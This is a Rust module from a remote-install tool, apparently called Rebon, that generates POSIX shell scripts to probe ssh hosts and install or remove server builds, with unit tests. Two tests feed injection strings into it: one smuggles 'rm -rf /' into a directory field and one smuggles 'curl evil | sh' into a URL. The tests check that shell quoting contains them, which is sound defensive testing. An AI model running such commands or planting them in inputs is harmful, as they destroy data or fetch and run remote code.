//! The shell scripts Rebon runs on the far end.
//!
//! Generated rather than shipped as files because they have to be
//! parameterised by paths that come from user configuration, and a
//! file would have to be installed before it could be used — which is
//! the very thing the install script exists to do.
//!
//! Three rules hold for everything here:
//!
//! 1. **POSIX `sh`, not bash.** The far end may be Alpine, where
//!    `/bin/sh` is busybox ash. No arrays, no `[[`, no `local`.
//! 2. **Every interpolated value is [`sh_quote`]d.** A project path is
//!    user input that reaches a shell; the quoting is the boundary.
//! 3. **Output is framed by markers.** A login shell that prints a
//!    banner, an rc file that echoes, a `tar` that warns — all land on
//!    the same stream as the answer. Parsing between markers means
//!    that noise cannot be mistaken for data.

use crate::remote::host::RemoteHost;
use crate::remote::platform::RemotePlatform;
use crate::remote::shquote::sh_quote;

pub const PROBE_BEGIN: &str = "__REBON_PROBE_BEGIN__";
pub const PROBE_END: &str = "__REBON_PROBE_END__";
pub const INSTALL_OK: &str = "__REBON_INSTALL_OK__";
pub const INSTALL_SKIPPED: &str = "__REBON_INSTALL_SKIPPED__";

/// What the far end told us about itself.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct ProbeReport {
    pub os: String,
    pub arch: String,
    pub home: Option<String>,
    /// Tools found on the remote `PATH`.
    pub tools: Vec<String>,
    /// `--version` output of the server build we asked about, when it
    /// is already installed.
    pub server_version: Option<String>,
    /// `rebon` found on the remote `PATH`, if any.
    pub path_rebon: Option<String>,
}

impl ProbeReport {
    pub fn platform(&self) -> Result<RemotePlatform, crate::remote::platform::PlatformError> {
        RemotePlatform::from_uname(&self.os, &self.arch)
    }

    pub fn has(&self, tool: &str) -> bool {
        self.tools.iter().any(|found| found == tool)
    }

    /// Which downloader the remote can use, if any.
    pub fn downloader(&self) -> Option<&'static str> {
        if self.has("curl") {
            Some("curl")
        } else if self.has("wget") {
            Some("wget")
        } else {
            None
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error)]
pub enum ProbeParseError {
    #[error("the remote produced no probe output — the ssh command did not run")]
    NoOutput,
    #[error("the remote probe output had no `{PROBE_END}` marker; it was cut off mid-run")]
    Truncated,
    #[error("the remote probe reported no operating system")]
    MissingOs,
}

/// The one round trip that answers everything an install needs.
///
/// Batched deliberately: each ssh command is a TCP handshake plus an
/// auth, and asking six questions separately turns a 200 ms setup into
/// well over a second on a transatlantic link.
pub fn probe_script(host: &RemoteHost, version: &str, binary_name: &str) -> String {
    let server_binary = host.server_binary_expr(version, binary_name);
    format!(
        r#"echo {begin}
echo "os=$(uname -s 2>/dev/null)"
echo "arch=$(uname -m 2>/dev/null)"
echo "home=$HOME"
for t in curl wget tar gzip npm node git; do
  if command -v "$t" >/dev/null 2>&1; then echo "tool=$t"; fi
done
if p=$(command -v rebon 2>/dev/null); then echo "pathRebon=$p"; fi
if [ -x {server_binary} ]; then
  echo "server=$({server_binary} --version 2>/dev/null | head -n 1)"
fi
echo {end}"#,
        begin = sh_quote(PROBE_BEGIN),
        end = sh_quote(PROBE_END),
    )
}

/// Read a probe report out of whatever the remote printed.
pub fn parse_probe(stdout: &str) -> Result<ProbeReport, ProbeParseError> {
    let body = match stdout.split_once(PROBE_BEGIN) {
        Some((_, rest)) => rest,
        None => return Err(ProbeParseError::NoOutput),
    };
    let Some((body, _)) = body.split_once(PROBE_END) else {
        return Err(ProbeParseError::Truncated);
    };

    let mut report = ProbeReport::default();
    for line in body.lines() {
        let line = line.trim();
        let Some((key, value)) = line.split_once('=') else {
            continue;
        };
        let value = value.trim().to_string();
        if value.is_empty() {
            continue;
        }
        match key.trim() {
            "os" => report.os = value,
            "arch" => report.arch = value,
            "home" => report.home = Some(value),
            "tool" => report.tools.push(value),
            "server" => report.server_version = Some(value),
            "pathRebon" => report.path_rebon = Some(value),
            _ => {}
        }
    }
    if report.os.is_empty() {
        return Err(ProbeParseError::MissingOs);
    }
    Ok(report)
}

/// Where the package bytes come from.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum PackageSource {
    /// The remote downloads it.
    Url(String),
    /// Rebon streams it on the ssh connection's stdin.
    Stdin,
}

/// Install (or reinstall) a server build under `<server_dir>/<version>`.
///
/// The layout is versioned so an upgrade never writes over the binary
/// a live session is running out of — a running remote agent keeps its
/// old directory until it exits, and the next connection picks up the
/// new one.
pub fn install_script(
    host: &RemoteHost,
    version: &str,
    binary_name: &str,
    source: &PackageSource,
    force: bool,
) -> String {
    let root = host.server_root_expr();
    let version_q = sh_quote(version);
    let binary_q = sh_quote(binary_name);

    let fetch = match source {
        PackageSource::Url(url) => format!(
            r#"if command -v curl >/dev/null 2>&1; then
  curl -fsSL --retry 3 --retry-delay 1 {url} -o "$tmp/pkg.tgz"
elif command -v wget >/dev/null 2>&1; then
  wget -q -O "$tmp/pkg.tgz" {url}
else
  echo "rebon: the remote has neither curl nor wget; use --install push" >&2
  exit 3
fi"#,
            url = sh_quote(url)
        ),
        // No `set -o pipefail` in POSIX sh, so the size check below is
        // what catches a stream that died halfway.
        PackageSource::Stdin => r#"cat > "$tmp/pkg.tgz""#.to_string(),
    };

    // `skip` is emitted as a separate marker so the caller can report
    // "already installed" rather than claiming to have installed
    // something it did not touch.
    let skip_guard = if force {
        String::new()
    } else {
        format!(
            r#"if [ -x "$dest"/{binary_q} ]; then
  echo {skipped}
  exit 0
fi
"#,
            skipped = sh_quote(INSTALL_SKIPPED)
        )
    };

    format!(
        r#"set -eu
root={root}
dest="$root"/{version_q}
{skip_guard}mkdir -p "$root"
tmp="$root"/.staging.$$
rm -rf "$tmp"
mkdir -p "$tmp"
trap 'rm -rf "$tmp"' EXIT INT TERM HUP
{fetch}
if [ ! -s "$tmp/pkg.tgz" ]; then
  echo "rebon: the package transfer produced an empty file" >&2
  exit 4
fi
tar -xzf "$tmp/pkg.tgz" -C "$tmp"
if [ ! -x "$tmp/package/bin"/{binary_q} ] && [ ! -f "$tmp/package/bin"/{binary_q} ]; then
  echo "rebon: the package did not contain bin/"{binary_q} >&2
  exit 5
fi
chmod +x "$tmp/package/bin"/* 2>/dev/null || true
rm -rf "$dest".old
if [ -d "$dest" ]; then mv "$dest" "$dest".old; fi
mv "$tmp/package/bin" "$dest"
rm -rf "$dest".old
echo {ok}
"#,
        ok = sh_quote(INSTALL_OK),
    )
}

/// `npm install -g` on the far end.
pub fn npm_install_script(version: &str) -> String {
    let spec = sh_quote(&format!("@rebon/cli@{version}"));
    format!(
        r#"set -eu
if ! command -v npm >/dev/null 2>&1; then
  echo "rebon: the remote has no npm; use --install fetch or --install push" >&2
  exit 3
fi
npm install -g {spec} >&2
command -v rebon >/dev/null 2>&1 || {{
  echo "rebon: npm reported success but rebon is not on the remote PATH" >&2
  exit 6
}}
echo {ok}
"#,
        ok = sh_quote(INSTALL_OK),
    )
}

/// Remove one installed version, or every one of them.
pub fn uninstall_script(host: &RemoteHost, version: Option<&str>) -> String {
    let root = host.server_root_expr();
    match version {
        Some(version) => format!(
            r#"set -eu
rm -rf {root}/{version}
echo {ok}
"#,
            version = sh_quote(version),
            ok = sh_quote(INSTALL_OK)
        ),
        None => format!(
            r#"set -eu
rm -rf {root}
echo {ok}
"#,
            ok = sh_quote(INSTALL_OK)
        ),
    }
}

/// Whether an install script's output means it did the work, skipped
/// it, or neither.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum InstallOutcome {
    Installed,
    AlreadyPresent,
    Unknown,
}

pub fn parse_install_outcome(stdout: &str) -> InstallOutcome {
    // Order matters: the skip marker short-circuits before the script
    // can print the success one, but both are checked so a future
    // script that prints them in the other order does not flip the
    // meaning.
    if stdout.contains(INSTALL_SKIPPED) {
        InstallOutcome::AlreadyPresent
    } else if stdout.contains(INSTALL_OK) {
        InstallOutcome::Installed
    } else {
        InstallOutcome::Unknown
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn host() -> RemoteHost {
        RemoteHost::from_target("prod", "deploy@host").unwrap()
    }

    #[test]
    fn the_probe_asks_everything_in_one_round_trip() {
        let script = probe_script(&host(), "0.15.0", "rebon");
        for needle in ["uname -s", "uname -m", "$HOME", "command -v", "--version"] {
            assert!(script.contains(needle), "missing {needle} in:\n{script}");
        }
        assert!(script.contains(PROBE_BEGIN));
        assert!(script.contains(PROBE_END));
    }

    #[test]
    fn probe_output_is_read_only_between_the_markers() {
        // A login banner and an rc file that echoes are normal; they
        // must not be able to forge a field.
        let stdout = format!(
            "Welcome to prod!\nos=NotAnOs\n{PROBE_BEGIN}\nos=Linux\narch=x86_64\nhome=/home/deploy\ntool=curl\ntool=tar\n{PROBE_END}\nos=AlsoNot\n"
        );
        let report = parse_probe(&stdout).unwrap();
        assert_eq!(report.os, "Linux");
        assert_eq!(report.arch, "x86_64");
        assert_eq!(report.home.as_deref(), Some("/home/deploy"));
        assert!(report.has("curl"));
        assert!(report.has("tar"));
        assert!(!report.has("npm"));
    }

    #[test]
    fn a_probe_that_never_ran_is_distinguishable_from_one_cut_short() {
        assert_eq!(parse_probe("").unwrap_err(), ProbeParseError::NoOutput);
        assert_eq!(
            parse_probe(&format!("{PROBE_BEGIN}\nos=Linux\n")).unwrap_err(),
            ProbeParseError::Truncated
        );
    }

    #[test]
    fn a_probe_with_no_os_is_an_error_not_an_empty_report() {
        let stdout = format!("{PROBE_BEGIN}\narch=x86_64\n{PROBE_END}");
        assert_eq!(
            parse_probe(&stdout).unwrap_err(),
            ProbeParseError::MissingOs
        );
    }

    #[test]
    fn empty_values_are_dropped_rather_than_stored_blank() {
        // `uname -s` on a broken PATH prints nothing; recording `os=""`
        // would turn a clear failure into a confusing one.
        let stdout = format!("{PROBE_BEGIN}\nos=Linux\narch=x86_64\nhome=\n{PROBE_END}");
        let report = parse_probe(&stdout).unwrap();
        assert_eq!(report.home, None);
    }

    #[test]
    fn the_probe_reports_an_installed_server_and_a_path_rebon_separately() {
        let stdout = format!(
            "{PROBE_BEGIN}\nos=Linux\narch=aarch64\nserver=rebon 0.15.0\npathRebon=/usr/local/bin/rebon\n{PROBE_END}"
        );
        let report = parse_probe(&stdout).unwrap();
        assert_eq!(report.server_version.as_deref(), Some("rebon 0.15.0"));
        assert_eq!(report.path_rebon.as_deref(), Some("/usr/local/bin/rebon"));
        assert_eq!(report.platform().unwrap(), RemotePlatform::LinuxArm64);
    }

    #[test]
    fn downloader_prefers_curl_and_admits_when_there_is_none() {
        let mut report = ProbeReport {
            os: "Linux".into(),
            arch: "x86_64".into(),
            ..ProbeReport::default()
        };
        assert_eq!(report.downloader(), None);
        report.tools.push("wget".into());
        assert_eq!(report.downloader(), Some("wget"));
        report.tools.push("curl".into());
        assert_eq!(report.downloader(), Some("curl"));
    }

    #[test]
    fn the_install_script_stages_and_swaps_rather_than_writing_in_place() {
        let script = install_script(
            &host(),
            "0.15.0",
            "rebon",
            &PackageSource::Url("https://example/pkg.tgz".into()),
            false,
        );
        // Staging dir, then a rename over the destination.
        assert!(script.contains(".staging.$$"), "{script}");
        assert!(
            script.contains(r#"mv "$tmp/package/bin" "$dest""#),
            "{script}"
        );
        // The old build is kept until the new one is in place.
        assert!(script.contains(r#"mv "$dest" "$dest".old"#), "{script}");
        // And the staging dir is cleaned up however the script exits.
        assert!(
            script.contains("trap 'rm -rf \"$tmp\"' EXIT INT TERM HUP"),
            "{script}"
        );
    }

    #[test]
    fn the_install_script_fails_loudly_on_an_empty_transfer() {
        // A truncated download that still exits 0 would otherwise be
        // untarred into an empty directory and reported as success.
        let script = install_script(&host(), "0.15.0", "rebon", &PackageSource::Stdin, false);
        assert!(script.contains(r#"if [ ! -s "$tmp/pkg.tgz" ]"#), "{script}");
        assert!(script.contains("set -eu"), "{script}");
    }

    #[test]
    fn the_skip_guard_is_present_without_force_and_gone_with_it() {
        let guarded = install_script(&host(), "0.15.0", "rebon", &PackageSource::Stdin, false);
        assert!(guarded.contains(INSTALL_SKIPPED), "{guarded}");
        let forced = install_script(&host(), "0.15.0", "rebon", &PackageSource::Stdin, true);
        assert!(!forced.contains(INSTALL_SKIPPED), "{forced}");
    }

    #[test]
    fn stdin_and_url_sources_produce_different_transfers() {
        let pushed = install_script(&host(), "0.15.0", "rebon", &PackageSource::Stdin, true);
        assert!(pushed.contains(r#"cat > "$tmp/pkg.tgz""#), "{pushed}");
        assert!(!pushed.contains("curl"), "{pushed}");

        let fetched = install_script(
            &host(),
            "0.15.0",
            "rebon",
            &PackageSource::Url("https://example/x.tgz".into()),
            true,
        );
        assert!(fetched.contains("curl -fsSL"), "{fetched}");
        assert!(fetched.contains("wget -q -O"), "{fetched}");
        assert!(!fetched.contains(r#"cat > "$tmp/pkg.tgz""#), "{fetched}");
    }

    #[test]
    fn a_hostile_server_dir_reaches_the_script_only_in_quoted_form() {
        // The payload text does appear — inside single quotes, with
        // its own quote escaped. What must never appear is the raw
        // string, which would end the `root=` assignment and start a
        // second command.
        let raw = "/opt/x'; rm -rf /; echo '";
        let mut host = host();
        host.server_dir = Some(raw.into());
        let script = install_script(&host, "0.15.0", "rebon", &PackageSource::Stdin, true);
        assert!(script.contains(&sh_quote(raw)), "{script}");
        assert!(!script.contains(&format!("root={raw}")), "{script}");
    }

    #[test]
    fn a_hostile_url_reaches_the_script_only_in_quoted_form() {
        let raw = "https://x/'; curl evil | sh; echo '";
        let script = install_script(
            &host(),
            "0.15.0",
            "rebon",
            &PackageSource::Url(raw.into()),
            true,
        );
        assert!(script.contains(&sh_quote(raw)), "{script}");
        assert!(
            !script.contains(&format!("--retry-delay 1 {raw}")),
            "{script}"
        );
    }

    #[test]
    fn the_version_directory_is_what_gets_replaced() {
        // Two versions coexist; installing one must not disturb the
        // other, because a live session is running out of it.
        let script = install_script(&host(), "0.16.0", "rebon", &PackageSource::Stdin, true);
        assert!(script.contains(r#"dest="$root"/0.16.0"#), "{script}");
    }

    #[test]
    fn npm_install_refuses_early_when_npm_is_missing() {
        let script = npm_install_script("0.15.0");
        assert!(script.contains("command -v npm"), "{script}");
        assert!(script.contains("@rebon/cli@0.15.0"), "{script}");
        // npm's own chatter goes to stderr so it cannot be mistaken
        // for the success marker.
        assert!(
            script.contains("npm install -g @rebon/cli@0.15.0 >&2"),
            "{script}"
        );
    }

    #[test]
    fn uninstall_targets_one_version_or_the_whole_root() {
        let one = uninstall_script(&host(), Some("0.15.0"));
        assert!(
            one.contains(r#"rm -rf "$HOME"/.rebon/server/0.15.0"#),
            "{one}"
        );
        let all = uninstall_script(&host(), None);
        assert!(all.contains(r#"rm -rf "$HOME"/.rebon/server"#), "{all}");
        assert!(!all.contains("0.15.0"), "{all}");
    }

    #[test]
    fn install_outcomes_are_read_off_the_markers() {
        assert_eq!(
            parse_install_outcome(&format!("noise\n{INSTALL_OK}\n")),
            InstallOutcome::Installed
        );
        assert_eq!(
            parse_install_outcome(&format!("{INSTALL_SKIPPED}\n")),
            InstallOutcome::AlreadyPresent
        );
        // Exit code 0 with no marker means the script did not reach
        // its end — never report that as success.
        assert_eq!(
            parse_install_outcome("all done!\n"),
            InstallOutcome::Unknown
        );
    }
}
